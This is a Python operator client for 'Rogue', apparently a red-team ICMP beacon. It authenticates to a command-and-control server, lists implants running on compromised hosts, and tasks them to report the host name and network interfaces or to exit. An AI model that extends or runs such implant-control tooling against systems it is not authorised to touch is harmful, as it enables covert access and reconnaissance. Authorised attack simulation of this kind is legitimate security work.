##
## ROGUE
##
## GuidePoint Security LLC
##
## Threat and Attack Simulation Team
##
import sys
import time
import base64
import argparse

##
## Library
##
from lib import midna
from lib import logging
from lib import tasking

##
## Create argument
##
if __name__ in '__main__':
    opts = argparse.ArgumentParser( description = 'Rogue: minimal ICMP beacon client.' );
    opts.add_argument( '-u', '--username', help = 'Username to use when connecting to midna. ( e.g. username@hostname ) ', required = False, default = 'user@midna.local', type = str );
    opts.add_argument( '-p', '--password', help = 'Password to use when connecting to midna. ( e.g. password ) ', required = False, default = 'password', type = str );
    opts.add_argument( '-i', '--interact', help = 'ID of the agent to interact with.', required = False, default = '', type = str );
    opts.add_argument( '-b', '--block', help = 'Block until the task has been executed.', action = 'store_true', default = False );
    cmds = opts.add_subparsers( help = 'client commands.', dest = 'subcommand', required = True );
    cmds.add_parser( 'hello', help = 'Tasks the agent to say hello.' );
    cmds.add_parser( 'list', help = 'Prints a list of agents that are connected.' );
    cmds.add_parser( 'exit', help = 'Tasks the agent to exit.' );
    args = opts.parse_args();

    ##
    ## Connect to midna
    ## 
    try:
        Web = midna.Midna( args.username, args.password );
        Web.get_auth();
    except:
        logging.error( 'could not establish a connection with midna.' );
        raise SystemExit;

    ##
    ## "list"
    ##
    if args.subcommand == 'list':
        ##
        ## Get the list of targets
        ##
        Tgt = Web.get_targets();

        for Client in Tgt:
            ##
            ## Print the list of clients
            ##
            if Client['software_id'] == 4:
                ##
                ## List information about the client
                ##
                logging.success( 'GUID: {} ID: {} Name: {} Arch: {}'.format( Client['guid'], Client['implant_id'], Client['machine_name'], Client['architecture'] ) );

    ##
    ## Everything else
    ##
    else:
        ##
        ## Get the target
        ##
        Tgt = Web.get_targets();

        ##
        ## Was a client name providied
        ##
        if args.interact != '':
            ##
            ## Locate the client in the target list.
            ##
            for Client in Tgt:
                ##
                ## Found
                ##
                if Client['implant_id'] == args.interact:
                    ##
                    ## Create the task.
                    ##
                    logging.success( 'Dispatching a task to the webserver' );

                    ##
                    ## Insert Task: Hello
                    ##
                    if args.subcommand == 'hello':
                        ##
                        ## Hello has no buffer
                        ##
                        Tsk = Web.new_task( {
                            'code': tasking.COMMAND_HELLO,
                            'target_id': Client['id'],
                            'args': { 'buffer': '{}'.format( base64.b64encode( b'' ).decode() ) }
                        } );

                    ##
                    ## Insert Task: Exit
                    ##
                    if args.subcommand == 'exit':
                        ##
                        ## ExitFree has no buffer
                        ##
                        Tsk = Web.new_task( {
                            'code': tasking.COMMAND_EXITFREE,
                            'target_id': Client['id'],
                            'args': { 'buffer': '{}'.format( base64.b64encode( b'' ).decode() ) }
                        } );

                    ##
                    ## Print Info
                    ##
                    logging.success( 'Task has been added to the queue.' );

                    ##
                    ## Abort
                    ##
                    if args.block != False and args.subcommand != 'exit':
                        while True:
                            try:
                                ##
                                ## Read the current task
                                ##
                                Obj = Web.get_task( str( Tsk['id'] ) )[0];

                                ##
                                ##
                                ## Did it succeeed?
                                if ( Obj['status'] == 3 ):
                                    ##
                                    ## Success!
                                    ##
                                    logging.success( 'Task was executed sucessfully. Task returned {}'.format( Obj['return_code'] ) );

                                    if args.subcommand == 'hello':
                                        ##
                                        ## Remove
                                        ##
                                        Str = base64.b64decode( Obj['return_data'] )
                                        Dsk = Str[ 10 : ].decode().split( '\t' )[ 0 ]
                                        Ips = Str[ 10 : ].decode().split( '\t' )[ 1 ]

                                        ##
                                        ## Destktop name
                                        ##
                                        logging.print( 'NETBIOS: {}'.format( Dsk ) );

                                        for Info in Ips.split(';'):
                                            ##
                                            ## Print the interface and IPv4
                                            ##
                                            if Info:
                                                logging.print( '{}'.format( Info ) );

                                    break;
                                else:
                                    ##
                                    ## Nothing yet.
                                    ##
                                    time.sleep( 5 );
                            except Exception as Error:
                                logging.error( 'Error {}'.format( Error ) );
                                raise SystemExit;

                    break;
        else:
            logging.error( 'please provide an id to interact with.' );
